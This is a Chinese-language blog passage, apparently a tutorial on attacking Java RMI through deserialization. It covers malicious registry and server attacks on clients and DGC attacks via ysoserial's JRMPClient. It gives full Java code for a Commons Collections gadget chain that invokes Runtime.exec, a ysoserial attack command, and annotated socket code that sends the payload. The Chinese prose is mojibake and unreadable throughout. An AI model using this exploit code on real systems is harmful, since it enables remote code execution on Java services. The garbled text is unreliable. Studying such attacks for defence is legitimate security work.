<h2 id="è¿œç¨‹åŠ è½½å¯¹è±¡ï¼ˆJAVAç‰ˆæœ¬è¦æ¯”è¾ƒä½ï¼Œåˆ©ç”¨è‹›åˆ»ï¼‰"><a href="#è¿œç¨‹åŠ è½½å¯¹è±¡ï¼ˆJAVAç‰ˆæœ¬è¦æ¯”è¾ƒä½ï¼Œåˆ©ç”¨è‹›åˆ»ï¼‰" class="headerlink" title="è¿œç¨‹åŠ è½½å¯¹è±¡ï¼ˆJAVAç‰ˆæœ¬è¦æ¯”è¾ƒä½ï¼Œåˆ©ç”¨è‹›åˆ»ï¼‰"></a>è¿œç¨‹åŠ è½½å¯¹è±¡ï¼ˆJAVAç‰ˆæœ¬è¦æ¯”è¾ƒä½ï¼Œåˆ©ç”¨è‹›åˆ»ï¼‰</h2><p>æ„Ÿå…´è¶£çš„å¸ˆå‚…å»çœ‹su18å¸ˆå‚…çš„æ–‡ç« å§ã€‚<a href="https://su18.org/post/rmi-attack/#1-%E6%94%BB%E5%87%BB-server-%E7%AB%AF">https://su18.org/post/rmi-attack/#1-%E6%94%BB%E5%87%BB-server-%E7%AB%AF</a></p>
<h1 id="æ”»å‡»å®¢æˆ·ç«¯"><a href="#æ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="æ”»å‡»å®¢æˆ·ç«¯"></a>æ”»å‡»å®¢æˆ·ç«¯</h1><h2 id="æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯"><a href="#æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯"></a>æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯</h2><p>åœ¨å‰é¢åˆ†æJRMPåè®®è¿‡ç¨‹ä¸­ï¼Œå½“Clientåœ¨è¿æ¥Serverä¹‹å‰ï¼ŒRegistryä¼šè¿”å›ç»™Clientä¸€äº›åºåˆ—åŒ–æ•°æ®ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ­å»ºæ¶æ„çš„Registryæ¥æ¨¡æ‹ŸJRMPåè®®é€šä¿¡ï¼Œè¿”å›ç»™Clientä¸€äº›æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¾¾åˆ°æ”»å‡»çš„æ•ˆæœäº†ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸ªå¾ˆä¸¥é‡çš„ç¼ºé™·å°±æ˜¯å®¢æˆ·ç«¯å¿…é¡»å» lookup æŒ‡å®šæ¶æ„å¯¹è±¡æ‰è¡Œã€‚</p>
<p>å¦å¤–æ³¨æ„è¿™é‡Œè™½ç„¶æ²¡ç›´æ¥ä½¿ç”¨RemoteObjlmplå¯¹è±¡ï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦new RemoteObjlmplï¼Œå› ä¸ºç»§æ‰¿äº†UnicastRemoteObjectï¼ŒUnicastRemoteObjectä¸­ä¼šå¼€å¯ç½‘ç»œçº¿ç¨‹ï¼Œé˜»å¡ä¸»çº¿ç¨‹ï¼Œè®©serverç­‰å¾…clientè¿æ¥ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AlreadyBoundException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;<br>        <br>        <span class="hljs-type">RemoteObjlmpl</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjlmpl</span>();<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) getEvilClass();<br><br>        <span class="hljs-comment">//ä½¿ç”¨AnnotationInvocationHandleråŠ¨æ€ä»£ç†Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler);<br><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br><br>        registry.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remote);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250106225616792.png" alt="image-20250106225616792"></p>
<h2 id="æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯"><a href="#æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯"></a>æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯</h2><p>åœ¨RMIè¿‡ç¨‹ä¸­ï¼ŒServerä¼šæŠŠè¿œç¨‹æ–¹æ³•æ‰§è¡Œçš„ç»“æœè¿”å›ç»™Clientç«¯ï¼Œå¦‚æœè¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡ä¼šè¢«åºåˆ—åŒ–ä¼ è¾“ï¼Œå¹¶åœ¨Clientç«¯è¢«ååºåˆ—åŒ–ã€‚å¦‚æœæˆ‘ä»¬æ­å»ºæ¶æ„Serverç«¯ï¼Œè¿”å›ç»™Clientç«¯æ¶æ„å¯¹è±¡ï¼Œå°±å¯ä»¥è¾¾åˆ°æ”»å‡»çš„æ•ˆæœã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108175353444.png" alt="image-20250108175353444"></p>
<p>å®ç°æ¥å£ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªæ¶æ„çš„å¯¹è±¡ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108175436639.png" alt="image-20250108175436639"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AlreadyBoundException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">liming</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerReturnObject</span>(<span class="hljs-string">&quot;liming&quot;</span>,<span class="hljs-number">15</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        registry.bind(<span class="hljs-string">&quot;user&quot;</span>,liming);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>clientè°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼Œè¢«æˆåŠŸæ”»å‡»ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250108175640225.png" alt="image-20250108175640225"></p>
<h2 id="è¿œç¨‹åŠ è½½å¯¹è±¡ï¼ˆJAVAç‰ˆæœ¬è¦æ¯”è¾ƒä½ï¼Œåˆ©ç”¨è‹›åˆ»ï¼‰-1"><a href="#è¿œç¨‹åŠ è½½å¯¹è±¡ï¼ˆJAVAç‰ˆæœ¬è¦æ¯”è¾ƒä½ï¼Œåˆ©ç”¨è‹›åˆ»ï¼‰-1" class="headerlink" title="è¿œç¨‹åŠ è½½å¯¹è±¡ï¼ˆJAVAç‰ˆæœ¬è¦æ¯”è¾ƒä½ï¼Œåˆ©ç”¨è‹›åˆ»ï¼‰"></a>è¿œç¨‹åŠ è½½å¯¹è±¡ï¼ˆJAVAç‰ˆæœ¬è¦æ¯”è¾ƒä½ï¼Œåˆ©ç”¨è‹›åˆ»ï¼‰</h2><p>å…¶å®æ— è®º Server ç«¯è¿˜æ˜¯ Client ç«¯ï¼Œåªè¦æœ‰ä¸€ç«¯é…ç½®äº† <code>java.rmi.server.codebase</code>ï¼Œè¿™ä¸ªå±æ€§éƒ½ä¼šè·Ÿéšæ•°æ®æµåœ¨ä¸¤ç«¯æµåŠ¨ã€‚æ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯èƒ½è¢«æ”»å‡»çš„ã€‚</p>
<h1 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h1><p>åœ¨ä¸Šç¯‡æˆ‘ä»¬ä¹Ÿæåˆ°è¿‡DGCã€‚</p>
<p>RMI å®šä¹‰äº†ä¸€ä¸ª <code>java.rmi.dgc.DGC</code> æ¥å£ï¼Œæä¾›äº†ä¸¤ä¸ªæ–¹æ³• <code>dirty</code> å’Œ <code>clean</code>ï¼š</p>
<p>è¿™ä¸ªæ¥å£æœ‰ä¸¤ä¸ªå®ç°ç±»ï¼Œåˆ†åˆ«æ˜¯ <code>sun.rmi.transport.DGCImpl</code> ä»¥åŠ <code>sun.rmi.transport.DGCImpl_Stub</code>ï¼ŒåŒæ—¶è¿˜å®šä¹‰äº† <code>sun.rmi.transport.DGCImpl_Skel</code>ã€‚</p>
<p>å¾ˆåƒ Registryã€RegistryImplã€RegistryImpl_Stubã€RegistryImpl_Skelï¼Œå®é™…ä¸Šä¸å•æ˜¯å‘½åç›¸è¿‘ï¼Œå¤„ç†é€»è¾‘ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚é€šè¿‡åœ¨æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¹‹é—´ä¼ é€’å¼•ç”¨ï¼Œä¾æ—§æ˜¯ Stub ä¸ Skel ä¹‹é—´çš„é€šä¿¡æ¨¡å¼ï¼šServer ç«¯å¯åŠ¨ DGCImplï¼Œåœ¨ Registry ç«¯æ³¨å†Œ DGCImpl_Stub ï¼ŒClient ç«¯è·å–åˆ° DGCImpl_Stubï¼Œé€šè¿‡å…¶ä¸ Server ç«¯é€šä¿¡ï¼ŒServer ç«¯ä½¿ç”¨ DGCImpl_Skel æ¥å¤„ç†ã€‚</p>
<hr>
<p>DGC é€šä¿¡çš„å¤„ç†ç±»æ˜¯ DGCImpl_Skel çš„ dispatch æ–¹æ³•ï¼Œä¾æ—§é€šè¿‡ Java åŸç”Ÿçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥å¤„ç†å¯¹è±¡ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250109164957918.png" alt="image-20250109164957918"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250109165017215.png" alt="image-20250109165017215"></p>
<p>çœ‹åˆ°è¿™é‡Œåº”è¯¥å°±æ˜ç™½äº†ï¼Œä¼´éšç€ RMI æœåŠ¡å¯åŠ¨çš„ DGC é€šä¿¡ï¼Œä¹Ÿå­˜åœ¨è¢« Java ååºåˆ—åŒ–åˆ©ç”¨çš„å¯èƒ½ã€‚æˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ª DGC é€šä¿¡å¹¶åœ¨æŒ‡å®šçš„ä½ç½®å†™å…¥åºåˆ—åŒ–åçš„æ¶æ„ç±»å³å¯ã€‚</p>
<h2 id="å¯¹JRMPä¸­DGCæ“ä½œå®ç°çš„æ”»å‡»åˆ©ç”¨"><a href="#å¯¹JRMPä¸­DGCæ“ä½œå®ç°çš„æ”»å‡»åˆ©ç”¨" class="headerlink" title="å¯¹JRMPä¸­DGCæ“ä½œå®ç°çš„æ”»å‡»åˆ©ç”¨"></a>å¯¹JRMPä¸­DGCæ“ä½œå®ç°çš„æ”»å‡»åˆ©ç”¨</h2><p>åœ¨ä¸Šç¯‡æˆ‘ä»¬æåˆ°äº†<a href="https://sp4rks.xyz/2024/12/27/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E4%B8%93%E9%A2%98-%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E7%AF%87/#DGC">DGC</a>ï¼Œè¿™è¾¹æˆ‘ä»¬å¼€å¯ä¸€ä¸ªServerï¼Œå¹¶ä¸”åœ¨CCé“¾æœ€ç»ˆçš„è§¦å‘å¤„<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>å¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250110205904116.png" alt="image-20250110205904116"></p>
<p>ä½¿ç”¨ysoserialçš„<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java">exploit&#x2F;JRMPClient</a>æ¨¡å—ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">java -cp ysoserial.jar ysoserial.exploit.JRMPClient vps port CommonsCollecitons6 &#x27;calc.exe&#x27;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250110205946734.png" alt="image-20250110205946734"></p>
<p>ç„¶åæˆ‘ä»¬èƒ½çœ‹åˆ°è¿™äº›è°ƒç”¨æ ˆã€‚åœ¨1-5çš„åœ°æ–¹å‡æœ‰POCç”Ÿæˆåºåˆ—åŒ–æ•°æ®å¿…é¡»æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250110210609626.png" alt="image-20250110210609626"></p>
<p>è¿™éƒ¨åˆ†æˆ‘ä»¬å°±ç›´æ¥çœ‹<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java%E7%9A%84%E9%80%BB%E8%BE%91">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.javaçš„é€»è¾‘</a></p>
<p>å…¶æ ¸å¿ƒåœ¨äº<code>makeDGCCall</code>æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ä¼ å…¥ç›®æ ‡RMIæ³¨å†Œç«¯ï¼ˆä¹Ÿæ˜¯DGCæœåŠ¡ç«¯ï¼‰çš„IPç«¯å£ï¼Œä»¥åŠæ”»å‡»è½½è·çš„payloadå¯¹è±¡ã€‚</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makeDGCCall</span> <span class="hljs-params">( String hostname, <span class="hljs-type">int</span> port, Object payloadObject )</span> <span class="hljs-keyword">throws</span> IOException, UnknownHostException, SocketException &#123;<br>        <span class="hljs-type">InetSocketAddress</span> <span class="hljs-variable">isa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(hostname, port);<br>        <span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">dos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//å»ºç«‹ä¸€ä¸ªsocketé€šé“ï¼Œå¹¶ä¸ºèµ‹å€¼</span><br>            s = SocketFactory.getDefault().createSocket(hostname, port);<br>            s.setKeepAlive(<span class="hljs-literal">true</span>);<br>            s.setTcpNoDelay(<span class="hljs-literal">true</span>);<br>           <span class="hljs-comment">//è¯»å–socketé€šé“çš„æ•°æ®æµ</span><br>            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> s.getOutputStream();<br>            dos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(os);<br>           <span class="hljs-comment">//*******å¼€å§‹æ‹¼æ¥æ•°æ®æµ*********</span><br>            <span class="hljs-comment">//ä»¥ä¸‹å‡ä¸ºç‰¹å®šåè®®æ ¼å¼å¸¸é‡ï¼Œä¹‹åä¼šè¯´åˆ°è¿™äº›æ•°æ®æ˜¯æ€ä¹ˆæ¥çš„</span><br>            <span class="hljs-comment">//ä¼ è¾“é­”æœ¯å­—ç¬¦ï¼š0x4a524d49ï¼ˆä»£è¡¨åè®®ï¼‰</span><br>            dos.writeInt(TransportConstants.Magic);<br>            <span class="hljs-comment">//ä¼ è¾“åè®®ç‰ˆæœ¬å·ï¼š2ï¼ˆå°±æ˜¯ç‰ˆæœ¬å·ï¼‰</span><br>            dos.writeShort(TransportConstants.Version);<br>            <span class="hljs-comment">//ä¼ è¾“åè®®ç±»å‹: 0x4c (åè®®çš„ç§ç±»ï¼Œå¥½åƒæ˜¯å•å‘ä¼ è¾“æ•°æ®ï¼Œä¸éœ€è¦TCPçš„ACKç¡®è®¤)</span><br>            dos.writeByte(TransportConstants.SingleOpProtocol);<br>           <span class="hljs-comment">//ä¼ è¾“æŒ‡ä»¤-RMI callï¼š0x50 </span><br>            dos.write(TransportConstants.Call);<br><br>            <span class="hljs-meta">@SuppressWarnings</span> ( <span class="hljs-string">&quot;resource&quot;</span> )<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalOutputStream</span>(dos);<br>           <span class="hljs-comment">//DGCçš„å›ºå®šè¯»å–æ ¼å¼</span><br>            objOut.writeLong(<span class="hljs-number">2</span>); <span class="hljs-comment">// DGC</span><br>            objOut.writeInt(<span class="hljs-number">0</span>);<br>            objOut.writeLong(<span class="hljs-number">0</span>);<br>            objOut.writeShort(<span class="hljs-number">0</span>);<br>           <span class="hljs-comment">//é€‰å–DGCæœåŠ¡ç«¯çš„åˆ†æ”¯é€‰dirty</span><br>            objOut.writeInt(<span class="hljs-number">1</span>); <span class="hljs-comment">// dirty</span><br>            <span class="hljs-comment">//ç„¶åä¸€ä¸ªå›ºå®šçš„hashå€¼</span><br>            objOut.writeLong(-<span class="hljs-number">669196253586618813L</span>);<br>            <span class="hljs-comment">//æˆ‘ä»¬çš„ååºåˆ—åŒ–è§¦å‘ç‚¹</span><br>            objOut.writeObject(payloadObject);<br><br>            os.flush();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>æ ¹æ®è°ƒç”¨æ ˆæˆ‘ä»¬åœ¨TCPTransport$ConnectionHandler.run0æ‰“ä¸ªæ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•è¯»å–äº†ä¸€ä¸ªintæ•°æ®ï¼š</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112115842553.png" alt="image-20250112115842553"></p>
<p>ä¸‹å›¾åˆè¯»å–äº†ä¸€ä¸ªshortæ•°æ®ï¼Œç„¶åä¸ç›¸ç­‰çš„è¯å°±ç›´æ¥returnäº†ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112115718204.png" alt="image-20250112115718204"></p>
<p>æ¥ç€è¯»å–äº†ä¸€ä¸ªbyteæ•°æ®ï¼Œ76ï¼Œäºæ˜¯switchè¿›å…¥ä¸‹é¢çš„case76ï¼Œç»§è€Œè¿›å…¥handleMessageæ–¹æ³•ä¸­ï¼š</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112115514635.png" alt="image-20250112115514635"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„æ¡ä»¶å…¶å®å…¨éƒ¨éƒ½æ˜¯sun.rmi.transport.TransportConstantsçš„é™æ€å±æ€§ã€‚ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆysoserialä¸ºä»€ä¹ˆè¦è¿™æ ·å†™ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112142915850.png" alt="image-20250112142915850"></p>
<p>æˆ‘ä»¬æ¥ç€åˆ°äº†handleMessagesæ–¹æ³•ä¸­ï¼Œçœ‹åˆ°è¯»å–äº†intæ•°æ®80ï¼Œäºæ˜¯è¿›å…¥äº†switchä¸­çš„åˆ†æ”¯ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112120203905.png" alt="image-20250112120203905"></p>
<p>ç»§ç»­è·Ÿè¿›ï¼Œåˆ°äº†Transportç±»çš„serviceCall(final RemoteCall call)æ–¹æ³•ã€‚è¿™ä¸€éƒ¨åˆ†æ˜¯è¯»å–äº†å‚æ•°ä¹‹åè¿›è¡Œäº†æ ¡éªŒã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112120358993.png" alt="image-20250112120358993"></p>
<p>java.rmi.server.ObjID#readï¼Œnumç­‰äº2ï¼Œåˆè°ƒç”¨äº†java.rmi.server.UIDï¼Œé™æ€æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112144211722.png" alt="image-20250112144211722"> </p>
<p>å†è¿›å…¥UID.readæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°è¿ç»­è¯»å–äº†intã€longã€shortä¸‰ä¸ªæ•°æ®ï¼š å…¨éƒ½æ˜¯0</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112150134362.png" alt="image-20250112150134362"></p>
<p>å›åˆ°java.rmi.server.ObjID#read</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112120753342.png" alt="image-20250112120753342"></p>
<p>æ‰€ä»¥ä¸Šé¢æ‰§è¡ŒObjID.read()æ–¹æ³•çš„è¿‡ç¨‹ä¸­å°±æ˜¯é€šè¿‡è¯»å–æ•°æ®æœ€ç»ˆç”Ÿæˆä¸€ä¸ªObjIDå¯¹è±¡ã€‚è€Œå…¶ä¸­ä¸‰ä¸ªå˜é‡uniqueã€timeã€countåˆ™åˆ†åˆ«ä»£è¡¨</p>
<ul>
<li><p>æœåŠ¡ç«¯uidç»™å®¢æˆ·ç«¯çš„è¿œç¨‹å¯¹è±¡å”¯ä¸€æ ‡è¯†ç¼–å·ã€‚</p>
</li>
<li><p>è¿œç¨‹å¯¹è±¡æœ‰æ•ˆæ—¶é•¿ç”¨çš„æ—¶é—´æˆ³ã€‚</p>
</li>
<li><p>ç”¨äºåŒä¸€æ—¶é—´ç”³è¯·çš„ç»Ÿä¸€è¿œç¨‹å¯¹è±¡çš„å¦ä¸€ä¸ªç”¨äºåŒºåˆ†çš„éšæœºæ•°</p>
</li>
</ul>
<p>(è¿™éƒ¨åˆ†å…¶å®æ˜¯ysoserlalåºåˆ—åŒ–å†™å…¥çš„å€¼ã€‚æˆ‘ä»¬å› ä¸ºæ”»å‡»æœåŠ¡ç«¯ï¼Œæ²¡æœ‰å»æœåŠ¡ç«¯è·å–è¿‡è¿œç¨‹å¯¹è±¡æ‰€ä»¥éƒ½å†™æˆ0å³å¯ï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚)</p>
<p>éšåå’Œä¼šç”¨è¯¥ObjIDå¯¹è±¡ä¸dgcIDä½œæ¯”è¾ƒã€‚dgcIDæ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨æ­¤å¤„æ­¤å¤„è¿›è¡Œäº†éªŒè¯ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112150838692.png" alt="image-20250112150838692"></p>
<p>å¦‚ä¸Šæœ€ç»ˆdgcIDç”Ÿæˆçš„ç»“æ„å°±æ˜¯[0:0:0, 2]ã€‚ä¸ä¸Šé¢æ‰§è¡ŒObjID.read()æ–¹æ³•ç”Ÿæˆçš„ObjIDå€¼æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆysoserlalä¸ºä»€ä¹ˆè¿™ä¹ˆå†™çš„åŸå› ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112152611473.png" alt="image-20250112152611473"></p>
<p>æ¥ç€å¾€ä¸‹çœ‹è¿˜ä¸ä»ç„¶æ˜¯è·å–äº†Targetå¯¹è±¡ï¼Œç”±äºObjIDå€¼ä¸dgcIDå€¼ç›¸åŒï¼Œå› æ­¤æœ€ç»ˆç”Ÿæˆçš„Targetå¯¹è±¡æ˜¯DGCImplç±»å‹çš„ï¼Œ</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112125628890.png" alt="image-20250112125628890"></p>
<p>åé¢åŒæ ·è·å–äº†Targetçš„Dispatcherï¼Œç„¶åä½¿ç”¨å®ƒçš„dispatchæ–¹æ³•è¿›è¡Œåˆ†æ´¾ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112124812139.png" alt="image-20250112124812139"></p>
<p>åŒæ ·çš„ï¼Œåœ¨UnicastServerRefç±»ä¸­çš„dispatch(Remote obj, RemoteCall call)æ–¹æ³•ä¸­è¯»å–äº†ä¸€ä¸ªintå€¼ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112122833174.png" alt="image-20250112122833174"></p>
